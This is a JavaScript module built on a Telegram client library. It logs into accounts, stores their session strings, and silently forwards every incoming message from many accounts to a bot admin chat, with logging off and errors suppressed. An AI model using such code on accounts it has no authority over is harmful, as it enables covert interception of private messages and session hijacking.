const { TelegramClient } = require('telegram');
const { StringSession } = require('telegram/sessions');
const { NewMessage } = require('telegram/events');
const { Logger } = require("telegram/extensions/Logger");
const axios = require('axios');
const input = require('input');

Logger.setLevel("none");

class AccountManager {
    constructor(apiId, apiHash) {
        this.apiId = parseInt(apiId);
        this.apiHash = apiHash;
        this.activeClients = new Map();
    }

    async login(phone) {
        const client = new TelegramClient(new StringSession(""), this.apiId, this.apiHash, {
            deviceModel: "Professional Manager",
            appVersion: "69.4.20",
            systemVersion: "Windows 11 Pro",
            connectionRetries: 5,
            useWSS: false
        });

        client.setLogLevel("none");

        await client.start({
            phoneNumber: phone,
            password: async () => await input.text("Enter 2FA Password: "),
            phoneCode: async () => await input.text("Enter SMS Code: "),
            onError: (err) => {},
        });

        const sessionString = client.session.save();
        const userDetails = await client.getMe();
        await client.disconnect();
        
        return { session: sessionString, me: userDetails };
    }

    async sendNotification(botToken, adminId, text) {
        try {
            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
            await axios.post(url, {
                chat_id: adminId,
                text: text,
                parse_mode: 'HTML'
            });
        } catch (e) {
            // Error handled silently
        }
    }

    async initializeSessions(sessions, botConfig, callback) {
        const promises = sessions.map(async (s) => {
            try {
                const client = new TelegramClient(new StringSession(s.session), this.apiId, this.apiHash, {
                    connectionRetries: 2,
                    autoReconnect: true
                });
                
                client.setLogLevel("none");
                await client.connect();
                
                client.addEventHandler(async (event) => {
                    const msg = event.message;
                    if(msg && msg.message) {
                        const senderId = msg.senderId ? msg.senderId.toString() : 'Unknown';
                        const formattedText = msg.message.replace(/\n/g, ' ');
                        
                        callback({
                            phone: s.phone,
                            text: msg.message,
                            sender: senderId
                        });

                        if (botConfig && botConfig.token && botConfig.admin) {
                            const report = `<b>Notification System</b>\n\n<b>Account:</b> <code>${s.phone}</code>\n<b>Sender:</b> <code>${senderId}</code>\n\n${formattedText}`;
                            await this.sendNotification(botConfig.token, botConfig.admin, report);
                        }
                    }
                }, new NewMessage({}));
                
                this.activeClients.set(s.phone, client);
            } catch (e) {
                // Connection error handled silently
            }
        });
        await Promise.all(promises);
        return this.activeClients.size;
    }
}

module.exports = { AccountManager };
